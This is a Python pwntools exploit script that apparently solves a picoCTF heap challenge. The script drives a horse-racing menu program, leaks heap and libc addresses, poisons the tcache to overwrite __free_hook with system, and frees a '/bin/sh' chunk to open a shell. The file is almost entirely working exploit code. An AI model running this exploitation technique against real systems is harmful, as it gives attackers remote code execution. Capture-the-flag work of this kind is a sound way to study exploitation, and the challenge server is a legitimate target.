#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln_patched")
libc = ELF("./libc-chall.so.6", checksec = False)
ld = ELF("./ld-linux-x86-64.so.2", checksec = False)

context.binary = exe

gdbscript = \
"""
set follow-fork-mode parent
"""


def conn():
    global r

    if args.LOCAL:
        r = process([exe.path])
        if args.DDEBUG:
            gdb.attach(r, gdbscript)
    else:
        r = remote("saturn.picoctf.net", 57815)

    return r


def cheat(index: int, data: bytes, new_index: int):
    r.sendlineafter(b"Choice: ", b"0")
    r.sendlineafter(b"? ", str(index).encode("ascii"))
    r.sendlineafter(b": ", data)
    r.sendlineafter(b"? ", str(new_index).encode("ascii"))  # Useless parameter
    return


def add_horse(index: int, length: int, data: bytes):
    r.sendlineafter(b"Choice: ", b"1")
    r.sendlineafter(b"? ", str(index).encode("ascii"))
    r.sendlineafter(b"? ", str(length).encode("ascii"))
    r.sendlineafter(b": ", data)
    return


def remove_horse(index: int):
    r.sendlineafter(b"Choice: ", b"2")
    r.sendlineafter(b"? ", str(index).encode("ascii"))
    return


def race():
    r.sendlineafter(b"Choice: ", b"3")
    leaks = map(lambda l: l.strip(b"| \r"), r.recvlines(18))
    leaks = [l.ljust(8, b"\x00") for l in leaks if l != b""]
    return leaks    


def main():
    r = conn()

    for idx in range(12):
        add_horse(idx, 0x100, b"\xff")

    # I don't really know why but this permits to leak libc as well
    for idx in range(11, -1, -1):
        remove_horse(idx)

    for idx in range(12):
        add_horse(idx, 0x100, b"\xff")

    leaks = race()

    heap = int.from_bytes(leaks[-1], "little") << 12
    assert(heap & 0xFFF == 0)
    log.info(f"heap @ {hex(heap)}")

    libc.address = int.from_bytes(leaks[-2], "little") - 0x1040 - 0x1bc000 - 0x1000
    assert(libc.address & 0xFFF == 0)       # Sometimes it may retrieve a zero-value address from the race
    log.info(f"libc @ {hex(libc.address)}")

    # Now we have something like this in tcache: [0] -> [1]
    remove_horse(1)
    remove_horse(0)

    # Overwrite fd pointer to __free_hook. Now is [0] -> `__free_hook`
    # NOTE: We can use `exe.got["free"] - 8` instead of `__free_hook` to avoid libc leak as well,
    #       but we need to pad `exe.plt["system"]` with 8 bytes before
    target = p64((heap >> 12) ^ libc.symbols["__free_hook"])
    cheat(0, target + b"\xff", 0)

    # Remove chunk [0] from tcache
    add_horse(12, 256, b"A" * 0x10 + b"\xff")

    # Overwrite `__free_hook` with `system`
    add_horse(13, 256, p64(exe.plt["system"]) + b"\xff")

    # Add chunk containing "/bin/sh" for the `__free_hook`
    add_horse(14, 256, b"/bin/sh\x00\xff")

    # Spawn shell by triggering "freeing" the string "/bin/sh"
    remove_horse(14)
    r.interactive("$ ")


if __name__ == "__main__":
    main()
